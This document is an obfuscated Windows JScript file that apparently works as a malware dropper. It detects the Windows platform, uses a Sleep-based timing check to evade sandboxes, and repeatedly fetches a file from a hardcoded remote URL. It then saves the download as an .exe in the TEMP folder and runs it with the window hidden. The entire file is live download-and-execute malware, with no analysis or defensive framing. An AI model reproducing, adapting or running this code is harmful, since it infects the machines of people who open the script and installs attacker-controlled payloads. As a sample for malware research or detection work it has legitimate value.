var EV = false;
var d = "CreateObject";
var z = function fc() {return WScript[d]("WScript.Shell");}(), JD = 11;
var m = "MSXML2.XMLHTTP";
var hN = 2123213;
var Mm = 0;
function U(sY){z["Run"](sY, Mm, Mm);};
function zn(){return "" + m;};
function s(IJ, p0){Mm = Mm * 1; return IJ - p0;};
function zQ(){return d;};
/*@cc_on
  @if (@_win32 || @_win64)
    EV = true;
  @end
@*/
if (EV)
{
var MQ = "";
function p(){return 22;};
var k = 0; var y = 0;
function Z()
{
var Z0 = new this["Date"]();
var g = Z0["getUTCMilliseconds"]();
WScript["Sleep"](p());
var Z0 = new this["Date"]();
var Bs = Z0["getUTCMilliseconds"]();
WScript["Sleep"](p());
var Z0 = new this["Date"]();
var sH = Z0["getUTCMilliseconds"]();
var k = "MR";
k = s(Bs, g);
var y = "O";
y = s(sH, Bs);
MQ = "open";
return s(k, y);
}
var eA = false;
var S = false;
for (var a = Mm; a < p() * 1; a++){if (Z() != Mm){
eA = true; 
y = "31" + 11 * k + y; 
S = true; 
break;
}}
function BV() {return ((eA == true) && (eA == S)) ? 1 : Mm;};
if (eA && BV() && S){
function B() {return z["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8RWe6JHDRF2M.exe";};
 kD = zn();
 O0 = WScript[d](kD);
 var dX = 1;
 while (dX){
try {
O0[MQ]("GET", "http://www.aluguerdiadema.com/p9wsld", false);
O0["send"]();
ep = "Sleep";
for (;;){WScript[ep](p() * 11); if (O0["readystate"] >= 2 * 2) break;};
dX = Mm;
} catch(QG){};
}
function cK(pV) {var iw = (1, 2, 3, 4, 5, pV); return iw;};
HM = WScript[zQ()]("ADODB.Stream");
kD = HM;
kD[MQ]();
kD["type"] = cK(1);
kD["write"](O0["ResponseBody"]);
HM["position"] = cK(Mm);
kD["Save" + "ToFile"](B(), 2);
HM["c"+"lose"]();
eg = B();
U(eg);
}
}

